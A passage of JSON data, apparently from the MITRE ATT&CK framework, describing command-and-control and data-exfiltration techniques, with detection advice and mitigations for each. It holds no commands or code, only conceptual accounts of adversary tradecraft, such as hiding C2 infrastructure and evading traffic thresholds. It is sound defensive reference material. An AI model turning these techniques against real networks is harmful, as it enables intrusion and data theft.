application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."},{"id":"M1037","name":"Filter Network Traffic","description":"Consider filtering network traffic to untrusted or known bad domains and resources."}],"subTechniques":[]},{"id":"T1573","name":"Encrypted Channel","description":"Adversaries may employ an encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.","detection":"SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels. <a href=\"http://www.sans.org/reading-room/whitepapers/analyst/finding-hidden-threats-decrypting-ssl-34840\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SANS Decrypting SSL)</a> SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation. <a href=\"https://insights.sei.cmu.edu/cert/2015/03/the-risks-of-ssl-inspection.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SEI SSL Inspection Risks)</a>\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1020","name":"SSL/TLS Inspection","description":"SSL/TLS inspection can be used to see the contents of encrypted sessions to look for network-based indicators of malware communication protocols."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."}],"subTechniques":[{"id":"T1573.001","name":"Symmetric Cryptography","description":"Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.","detection":"With symmetric encryption, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."}]},{"id":"T1573.002","name":"Asymmetric Cryptography","description":"Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\n\nFor efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as Asymmetric Cryptography.","detection":"SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels. <a href=\"http://www.sans.org/reading-room/whitepapers/analyst/finding-hidden-threats-decrypting-ssl-34840\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SANS Decrypting SSL)</a> SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation. <a href=\"https://insights.sei.cmu.edu/cert/2015/03/the-risks-of-ssl-inspection.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SEI SSL Inspection Risks)</a>\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1020","name":"SSL/TLS Inspection","description":"SSL/TLS inspection can be used to see the contents of encrypted sessions to look for network-based indicators of malware communication protocols."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."}]}]},{"id":"T1659","name":"Content Injection","description":"Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., Drive-by Target followed by Drive-by Compromise), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., Ingress Tool Transfer) and other data to already compromised systems. <a href=\"https://www.welivesecurity.com/en/eset-research/moustachedbouncer-espionage-against-foreign-diplomats-in-belarus/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET MoustachedBouncer)</a>\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (<strong>Note:</strong> this is similar but distinct from Adversary-in-the-Middle, which describes AiTM activity solely within an enterprise environment) <a href=\"https://encyclopedia.kaspersky.com/glossary/man-in-the-middle-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky Encyclopedia MiTM)</a>\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server <a href=\"https://usa.kaspersky.com/blog/man-on-the-side/27854/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky ManOnTheSide)</a>\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\" <a href=\"https://usa.kaspersky.com/blog/man-on-the-side/27854/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky ManOnTheSide)</a> <a href=\"https://www.welivesecurity.com/en/eset-research/moustachedbouncer-espionage-against-foreign-diplomats-in-belarus/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET MoustachedBouncer)</a> <a href=\"https://www.eff.org/deeplinks/2015/04/china-uses-unencrypted-websites-to-hijack-browsers-in-github-attack\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: EFF China GitHub Attack)</a>","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Content","Process: Process Creation","File: File Creation"],"mitigations":[{"id":"M1021","name":"Restrict Web-Based Content","description":"Consider blocking download/transfer and execution of potentially uncommon file types known to be used in adversary campaigns."},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Where possible, ensure that online traffic is appropriately encrypted through services such as trusted VPNs."}],"subTechniques":[]},{"id":"T1665","name":"Hide Infrastructure","description":"Adversaries may manipulate network traffic in order to hide and evade detection of their C2 infrastructure. This can be accomplished by identifying and filtering traffic from defensive tools, <a href=\"https://www.proofpoint.com/us/blog/threat-insight/security-brief-ta571-delivers-icedid-forked-loader\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TA571)</a> masking malicious domains to obfuscate the true destination from both automated scanning tools and security researchers, <a href=\"https://www.mandiant.com/resources/blog/url-obfuscation-schema-abuse\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Schema-abuse)</a> <a href=\"https://github.com/spyboy-productions/Facad1ng\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Facad1ng)</a> <a href=\"https://www.proofpoint.com/us/blog/threat-insight/are-you-sure-your-browser-date-current-landscape-fake-browser-updates\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Browser-updates)</a> and otherwise hiding malicious artifacts to delay discovery and prolong the effectiveness of adversary infrastructure that could otherwise be identified, blocked, or taken down entirely.\n\nC2 networks may include the use of Proxy or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections. For example, an adversary may use a virtual private cloud to spoof their IP address to closer align with a victim's IP address ranges. This may also bypass security measures relying on geolocation of the source IP address. <a href=\"https://sysdig.com/content/c/pf-2023-global-cloud-threat-report?x=u_WFRi&xs=524303#page=1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: sysdig)</a> <a href=\"https://www.orangecyberdefense.com/global/blog/research/residential-proxies\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Orange Residential Proxies)</a>\n\nAdversaries may also attempt to filter network traffic in order to evade defensive tools in numerous ways, including blocking/redirecting common incident responder or security appliance user agents. <a href=\"https://bluescreenofjeff.com/2016-04-12-combatting-incident-responders-with-apache-mod_rewrite/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: mod_rewrite)</a> <a href=\"https://www.proofpoint.com/us/blog/threat-insight/part-1-socgholish-very-real-threat-very-fake-update\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SocGholish-update)</a> Filtering traffic based on IP and geo-fencing may also avoid automated sandboxing or researcher activity (i.e., Virtualization/Sandbox Evasion). <a href=\"https://www.proofpoint.com/us/blog/threat-insight/security-brief-ta571-delivers-icedid-forked-loader\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TA571)</a> <a href=\"https://bluescreenofjeff.com/2016-04-12-combatting-incident-responders-with-apache-mod_rewrite/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: mod_rewrite)</a>\n\nHiding C2 infrastructure may also be supported by Resource Development activities such as Acquire Infrastructure and Compromise Infrastructure. For example, using widely trusted hosting services or domains such as prominent URL shortening providers or marketing services for C2 networks may enable adversaries to present benign content that later redirects victims to malicious web pages or infrastructure once specific conditions are met. <a href=\"https://www.microsoft.com/en-us/security/blog/2023/12/07/star-blizzard-increases-sophistication-and-evasion-in-ongoing-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: StarBlizzard)</a> <a href=\"https://cofense.com/blog/major-energy-company-targeted-in-large-qr-code-campaign/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: QR-cofense)</a>","detection":"","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Internet Scan: Response Metadata","Network Traffic: Network Traffic Content","Domain Name: Domain Registration","Internet Scan: Response Content"],"mitigations":[],"subTechniques":[]}]},{"tactic":"Exfiltration","techniques":[{"id":"T1011","name":"Exfiltration Over Other Network Medium","description":"Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.\n\nAdversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.","detection":"Monitor for processes utilizing the network that do not normally have network communication or have never been seen before. Processes that normally require user-driven events to access the network (for example, a web browser opening with a mouse click or key press) but access the network without such may be malicious.\n\nMonitor for and investigate changes to host adapter settings, such as addition and/or replication of communication interfaces.","platforms":["Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Flow","Network Traffic: Network Connection Creation","Network Traffic: Network Traffic Content","File: File Access","Command: Command Execution"],"mitigations":[{"id":"M1028","name":"Operating System Configuration","description":"Prevent the creation of new network adapters where possible. <a href=\"https://technet.microsoft.com/library/dd252791.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft GPO Bluetooth FEB 2009)</a> <a href=\"https://www.techrepublic.com/blog/data-center/configuring-wireless-settings-via-group-policy/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechRepublic Wireless GPO FEB 2009)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel in local computer security settings or by group policy if it is not needed within an environment."}],"subTechniques":[{"id":"T1011.001","name":"Exfiltration Over Bluetooth","description":"Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.","detection":"Monitor for processes utilizing the network that do not normally have network communication or have never been seen before. Processes that normally require user-driven events to access the network (for example, a web browser opening with a mouse click or key press) but access the network without such may be malicious.\n\nMonitor for and investigate changes to host adapter settings, such as addition and/or replication of communication interfaces.","platforms":["Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Flow","Command: Command Execution","File: File Access","Network Traffic: Network Traffic Content","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1028","name":"Operating System Configuration","description":"Prevent the creation of new network adapters where possible."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable Bluetooth in local computer security settings or by group policy if it is not needed within an environment."}]}]},{"id":"T1020","name":"Automated Exfiltration","description":"Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. <a href=\"https://www.welivesecurity.com/2020/06/11/gamaredon-group-grows-its-game/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET Gamaredon June 2020)</a> \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel and Exfiltration Over Alternative Protocol.","detection":"Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious.","platforms":["Linux","macOS","Network Devices","Windows"],"dataSources":["Command: Command Execution","Network Traffic: Network Traffic Flow","File: File Access","Network Traffic: Network Connection Creation","Network Traffic: Network Traffic Content","Script: Script Execution"],"mitigations":[],"subTechniques":[{"id":"T1020.001","name":"Traffic Duplication","description":"Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. <a href=\"https://www.cisco.com/c/en/us/td/docs/routers/crs/software/crs_r5-1/interfaces/configuration/guide/hc51xcrsbook/hc51span.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Traffic Mirroring)</a> <a href=\"https://www.juniper.net/documentation/en_US/junos/topics/concept/port-mirroring-ex-series.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Juniper Traffic Mirroring)</a>\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through ROMMONkit or Patch System Image. <a href=\"https://www.us-cert.gov/ncas/alerts/TA18-106A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT-TA18-106A)</a> <a href=\"https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Blog Legacy Device Attacks)</a>\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to. <a href=\"https://docs.aws.amazon.com/vpc/latest/mirroring/traffic-mirroring-how-it-works.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Traffic Mirroring)</a> <a href=\"https://cloud.google.com/vpc/docs/packet-mirroring\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GCP Packet Mirroring)</a> <a href=\"https://docs.microsoft.com/en-us/azure/virtual-network/virtual-network-tap-overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure Virtual Network TAP)</a>\n\nAdversaries may use traffic duplication in conjunction with Network Sniffing, Input Capture, or Adversary-in-the-Middle depending on the goals and objectives of the adversary.","detection":"Monitor network traffic for uncommon data flows (e.g. unusual network communications, suspicious communications that have never been seen before, communications sending fixed size data packets at regular intervals).  Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.","platforms":["Network Devices","IaaS"],"dataSources":["Network Traffic: Network Connection Creation","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"In cloud environments, ensure that users are not granted permissions to create or modify traffic mirrors unless this is explicitly required."},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Ensure that all wired and/or wireless traffic is encrypted appropriately. Use best practices for authentication protocols, such as Kerberos, and ensure web traffic that may contain credentials is protected by SSL/TLS."},{"id":"M1057","name":"Data Loss Prevention","description":"Implement Data Loss Prevention (DLP) solutions to monitor, detect, and control the flow of sensitive information. DLP tools can be configured to block unauthorized attempts to exfiltrate data, such as preventing emails from being forwarded to external recipients or monitoring for suspicious data transfers. By creating email flow rules and applying policies to detect anomalies, DLP solutions help mitigate the risk of data exfiltration over alternative protocols."}]}]},{"id":"T1029","name":"Scheduled Transfer","description":"Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel or Exfiltration Over Alternative Protocol.","detection":"Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious. Network connections to the same destination that occur at the same time of day for multiple days are suspicious.","platforms":["Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Flow","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>"}],"subTechniques":[]},{"id":"T1030","name":"Data Transfer Size Limits","description":"An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). If a process maintains a long connection during which it consistently sends fixed size data packets or a process opens connections and sends fixed sized data packets at regular intervals, it may be performing an aggregate data transfer. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["Linux","macOS","Windows","ESXi"],"dataSources":["Network Traffic: Network Connection Creation","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level."}],"subTechniques":[]},{"id":"T1041","name":"Exfiltration Over C2 Channel","description":"Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Command: Command Execution","File: File Access","Network Traffic: Network Connection Creation","Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool command and control signatures over time or construct protocols in such a way to avoid detection by common defensive tools. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>"},{"id":"M1057","name":"Data Loss Prevention","description":"Data loss prevention can detect and block sensitive data being sent over unencrypted protocols."}],"subTechniques":[]},{"id":"T1048","name":"Exfiltration Over Alternative Protocol","description":"Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  \n\nAlternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. \n\nExfiltration Over Alternative Protocol can be done using various common operating system utilities such as Net/SMB or FTP. <a href=\"http://researchcenter.paloaltonetworks.com/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Palo Alto OilRig Oct 2016)</a> On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system. <a href=\"https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 20 macOS Common Tools and Techniques)</a>\n\nMany IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or Cloud API.","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["ESXi","IaaS","Linux","macOS","Network Devices","Office Suite","SaaS","Windows"],"dataSources":["Cloud Storage: Cloud Storage Access","Network Traffic: Network Traffic Flow","Command: Command Execution","Network Traffic: Network Traffic Content","Application Log: Application Log Content","File: File Access","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Configure user permissions groups and roles for access to cloud storage. <a href=\"https://docs.microsoft.com/en-us/azure/storage/common/storage-security-guide\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Azure Storage Security, 2019)</a> Implement strict Identity and Access Management (IAM) controls to prevent access to storage solutions except for the applications, users, and services that require access. <a href=\"https://aws.amazon.com/premiumsupport/knowledge-center/secure-s3-resources/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Amazon S3 Security, 2019)</a> Ensure that temporary access tokens are issued rather than permanent credentials, especially when access is being granted to entities outside of the internal security boundary. <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Amazon  AWS Temporary Security Credentials)</a>"},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Use access control lists on cloud storage systems and objects."},{"id":"M1030","name":"Network Segmentation","description":"Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network. <a href=\"https://technet.microsoft.com/en-us/library/cc700828.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Firewall Design)</a>"},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level."},{"id":"M1037","name":"Filter Network Traffic","description":"Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network. Cloud service providers support IP-based restrictions when accessing cloud resources. Consider using IP allowlisting along with user account management to ensure that data access is restricted not only to valid users but only from expected IP ranges to mitigate the use of stolen credentials to access data."},{"id":"M1057","name":"Data Loss Prevention","description":"Data loss prevention can detect and block sensitive data being uploaded via web browsers."}],"subTechniques":[{"id":"T1048.001","name":"Exfiltration Over Symmetric Encrypted Non-C2 Protocol","description":"Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nSymmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. \n\nNetwork protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP).","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a> \n\nArtifacts and evidence of symmetric key exchange may be recoverable by analyzing network traffic or looking for hard-coded values within malware. If recovered, these keys can be used to decrypt network data from command and control channels.","platforms":["Linux","macOS","Windows","ESXi"],"dataSources":["Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content","Command: Command Execution","File: File Access","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1030","name":"Network Segmentation","description":"Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network. <a href=\"https://technet.microsoft.com/en-us/library/cc700828.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Firewall Design)</a>"},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level."},{"id":"M1037","name":"Filter Network Traffic","description":"Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network."}]},{"id":"T1048.002","name":"Exfiltration Over Asymmetric Encrypted Non-C2 Protocol","description":"Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nAsymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. \n\nNetwork protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Flow","Command: Command Execution","File: File Access","Network Traffic: Network Connection Creation","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1030","name":"Network Segmentation","description":"Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network. <a href=\"https://technet.microsoft.com/en-us/library/cc700828.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Firewall Design)</a>"},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level."},{"id":"M1037","name":"Filter Network Traffic","description":"Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network."},{"id":"M1057","name":"Data Loss Prevention","description":"Data loss prevention can detect and block sensitive data being uploaded via web browsers."}]},{"id":"T1048.003","name":"Exfiltration Over Unencrypted Non-C2 Protocol","description":"Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. <a href=\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/fundamentals/command/cf_command_ref/C_commands.html#wp1068167689\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: copy_cmd_cisco)</a>\n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being 